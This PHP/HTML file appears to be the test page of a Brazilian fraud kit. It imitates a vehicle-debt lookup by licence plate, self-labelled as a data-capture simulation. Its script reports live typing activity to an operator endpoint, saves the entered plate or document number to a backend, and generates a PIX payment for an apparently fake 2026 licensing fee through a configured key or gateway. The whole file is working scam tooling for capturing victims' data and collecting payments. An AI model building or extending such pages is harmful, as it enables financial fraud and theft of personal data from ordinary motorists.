<?php
// pages/teste/index.php

if (empty($_COOKIE['user_id'])) {
    $uniqueId = uniqid(mt_rand(), true);
    setcookie('user_id', $uniqueId, time() + (86400 * 30), "/");
    $_COOKIE['user_id'] = $uniqueId;
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Teste - Captura</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f9; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
        input[type="text"] { width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        button { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>

<div class="container">
    <h1>Chackal o Sinistro</h1>
    <h2>Consulta de Débitos (Teste)</h2>
    <p>Simulação de captura de dados.</p>
    
    <form id="formConsulta">
        <label for="placa">Digite a Placa:</label>
        <input type="text" id="placa" name="placa" placeholder="ABC-1234" required>
        
        <button type="submit">Consultar Débitos</button>
    </form>

    <div id="resultado" style="margin-top: 20px; display: none;">
        <h3>Resultado da Consulta:</h3>
        <p id="msgResultado"></p>
        
        <!-- Simulação do botão de gerar PIX que enviaria para data/pix.php -->
        <button id="btnGerarPix" style="background-color: #007bff; margin-top: 10px;">Gerar PIX de Teste (R$ 10,00)</button>
    </div>
</div>

<script>
    const inputPlaca = document.getElementById('placa');
    const formConsulta = document.getElementById('formConsulta');
    const resultado = document.getElementById('resultado');
    const msgResultado = document.getElementById('msgResultado');
    const btnGerarPix = document.getElementById('btnGerarPix');

    // --- Lógica de Digitação Real-Time ---
    let typingInterval = null;
    let stopTypingTimeout = null;

    function startTyping() {
        if (!typingInterval) {
            console.log('Iniciando envio de status de digitação...');
            // Envia o primeiro sinal imediatamente
            fetch('../../api/typing_start.php');
            
            // Mantém o sinal ativo a cada 2 segundos enquanto houver atividade
            typingInterval = setInterval(() => {
                fetch('../../api/typing_start.php');
            }, 2000);
        }
    }

    function stopTyping() {
        console.log('Usuário parou de digitar.');
        clearInterval(typingInterval);
        typingInterval = null;
    }

    inputPlaca.addEventListener('input', function() {
        startTyping();

        // Se o usuário ficar 3 segundos sem digitar nada, consideramos que "parou"
        clearTimeout(stopTypingTimeout);
        stopTypingTimeout = setTimeout(() => {
            stopTyping();
        }, 3000);
    });

    // Quando o campo perde o foco, também paramos imediatamente
    inputPlaca.addEventListener('blur', stopTyping);

    // --- Resto da Lógica ---
    formConsulta.addEventListener('submit', function(e) {
        e.preventDefault();
        stopTyping(); // Garante que parou ao enviar
        const placaValue = inputPlaca.value;

        msgResultado.textContent = `Consultando base de dados para a placa ${placaValue}...`;
        resultado.style.display = 'block';

        fetch('../../api/salvar.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                tela: 'teste',
                doc: placaValue,
                bearer: 'sessao_ativa_teste'
            })
        })
        .then(res => {
            if (!res.ok) throw new Error('Erro 500: Tabela "conf" pode estar ausente no banco.');
            return res.json();
        })
        .then(data => {
            console.log('Dados salvos:', data);
            msgResultado.textContent = `Veículo encontrado! Débitos pendentes: R$ 10,00.`;
        })
        .catch(err => {
            console.error(err);
            msgResultado.textContent = `Aviso: Erro ao salvar log (Tabela 'conf' ausente), mas seguindo para o pagamento...`;
        });
    });
    
    // (O resto do código do PIX continua igual...)

    // 3. Geração do PIX (Real)
    // Como o PIX chega na tela?
    // O data/pix.php recebe os dados abaixo e:
    // a) Se o usuário configurou "ChavePix", o PHP usa a função gerarPix() para criar o texto "Copia e Cola" manualmente.
    // b) Se configurou um gateway (ex: PodPay), o PHP chama o gateway e recebe o código dele.
    btnGerarPix.addEventListener('click', function() {
        const placaValue = inputPlaca.value;

        btnGerarPix.disabled = true;
        btnGerarPix.textContent = 'Gerando PIX...';

        const formData = new FormData();
        formData.append('cpf_cnpj', placaValue); // Usando a placa como doc para o teste
        formData.append('nome', 'CLIENTE TESTE');
        formData.append('valor', '10.00');
        formData.append('debito', 'Taxa de Licenciamento 2026');

        fetch('../../data/pix.php', {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                // Aqui o PIX (texto Copia e Cola) chegou!
                // O usuário pode copiar esse texto e pagar no banco dele.
                alert('PIX GERADO COM SUCESSO!\n\nCopie o código abaixo:\n\n' + data.pix);
                console.log('Código Pix para Copia e Cola:', data.pix);
            } else {
                alert('Erro ao gerar PIX. Verifique se o usuário tem uma chave PIX configurada no painel.');
            }
        })
        .finally(() => {
            btnGerarPix.disabled = false;
            btnGerarPix.textContent = 'Gerar PIX de Teste (R$ 10,00)';
        });
    });
</script>

</body>
</html>
